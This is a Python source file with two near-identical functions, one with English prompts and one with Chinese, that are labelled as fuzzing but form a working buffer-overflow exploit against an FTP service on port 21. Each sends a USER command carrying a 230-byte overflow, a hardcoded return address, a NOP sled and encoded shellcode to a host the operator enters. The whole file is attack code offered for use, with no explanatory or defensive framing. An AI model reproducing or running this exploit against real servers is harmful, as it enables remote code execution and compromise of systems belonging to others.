def fuzzing7_e():
    import socket
    print ("Please enter target host!")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        print ("Please enter EIP address!")
        EIPIN = input()
        EIP = bytes(EIPIN)
        FUZZ = "A" * 230
        EIP = b"\xAF\x59\xA1\x75"
        NOPS = b"\x90" * 32
        shellcode = (b"\xb8\x37\xbb\xc6\x0f\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
        b"\x31\x31\x45\x13\x83\xc5\x04\x03\x45\x38\x59\x33\xf3\xae\x1f"
        b"\xbc\x0c\x2e\x40\x34\xe9\x1f\x40\x22\x79\x0f\x70\x20\x2f\xa3"
        b"\xfb\x64\xc4\x30\x89\xa0\xeb\xf1\x24\x97\xc2\x02\x14\xeb\x45"
        b"\x80\x67\x38\xa6\xb9\xa7\x4d\xa7\xfe\xda\xbc\xf5\x57\x90\x13"
        b"\xea\xdc\xec\xaf\x81\xae\xe1\xb7\x76\x66\x03\x99\x28\xfd\x5a"
        b"\x39\xca\xd2\xd6\x70\xd4\x37\xd2\xcb\x6f\x83\xa8\xcd\xb9\xda"
        b"\x51\x61\x84\xd3\xa3\x7b\xc0\xd3\x5b\x0e\x38\x20\xe1\x09\xff"
        b"\x5b\x3d\x9f\xe4\xfb\xb6\x07\xc1\xfa\x1b\xd1\x82\xf0\xd0\x95"
        b"\xcd\x14\xe6\x7a\x66\x20\x63\x7d\xa9\xa1\x37\x5a\x6d\xea\xec"
        b"\xc3\x34\x56\x42\xfb\x27\x39\x3b\x59\x23\xd7\x28\xd0\x6e\xbd"
        b"\xaf\x66\x15\xf3\xb0\x78\x16\xa3\xd8\x49\x9d\x2c\x9e\x55\x74"
        b"\x09\x40\xb4\x5d\x67\xe9\x61\x34\xca\x74\x92\xe2\x08\x81\x11"
        b"\x07\xf0\x76\x09\x62\xf5\x33\x8d\x9e\x87\x2c\x78\xa1\x34\x4c"
        b"\xa9\xc2\xdb\xde\x31\x2b\x7e\x67\xd3\x33")
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, 21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + EIP + NOPS + shellcode + b"\r\n")
        s.close()
    else:
        print("Error!")
def fuzzing7_c():
    import socket
    print("请输入目标主机IP!")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        print ("请输入EIP地址!")
        EIPIN = input()
        EIP =EIPIN.encode()
        FUZZ = "A" * 230
        EIP = b"\xAF\x59\xA1\x75"
        NOPS = b"\x90" * 32
        shellcode = (b"\xb8\x37\xbb\xc6\x0f\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
        b"\x31\x31\x45\x13\x83\xc5\x04\x03\x45\x38\x59\x33\xf3\xae\x1f"
        b"\xbc\x0c\x2e\x40\x34\xe9\x1f\x40\x22\x79\x0f\x70\x20\x2f\xa3"
        b"\xfb\x64\xc4\x30\x89\xa0\xeb\xf1\x24\x97\xc2\x02\x14\xeb\x45"
        b"\x80\x67\x38\xa6\xb9\xa7\x4d\xa7\xfe\xda\xbc\xf5\x57\x90\x13"
        b"\xea\xdc\xec\xaf\x81\xae\xe1\xb7\x76\x66\x03\x99\x28\xfd\x5a"
        b"\x39\xca\xd2\xd6\x70\xd4\x37\xd2\xcb\x6f\x83\xa8\xcd\xb9\xda"
        b"\x51\x61\x84\xd3\xa3\x7b\xc0\xd3\x5b\x0e\x38\x20\xe1\x09\xff"
        b"\x5b\x3d\x9f\xe4\xfb\xb6\x07\xc1\xfa\x1b\xd1\x82\xf0\xd0\x95"
        b"\xcd\x14\xe6\x7a\x66\x20\x63\x7d\xa9\xa1\x37\x5a\x6d\xea\xec"
        b"\xc3\x34\x56\x42\xfb\x27\x39\x3b\x59\x23\xd7\x28\xd0\x6e\xbd"
        b"\xaf\x66\x15\xf3\xb0\x78\x16\xa3\xd8\x49\x9d\x2c\x9e\x55\x74"
        b"\x09\x40\xb4\x5d\x67\xe9\x61\x34\xca\x74\x92\xe2\x08\x81\x11"
        b"\x07\xf0\x76\x09\x62\xf5\x33\x8d\x9e\x87\x2c\x78\xa1\x34\x4c"
        b"\xa9\xc2\xdb\xde\x31\x2b\x7e\x67\xd3\x33")
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host, 21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + EIP + NOPS + shellcode + b"\r\n")
        s.close()
    else:
        print("错误!")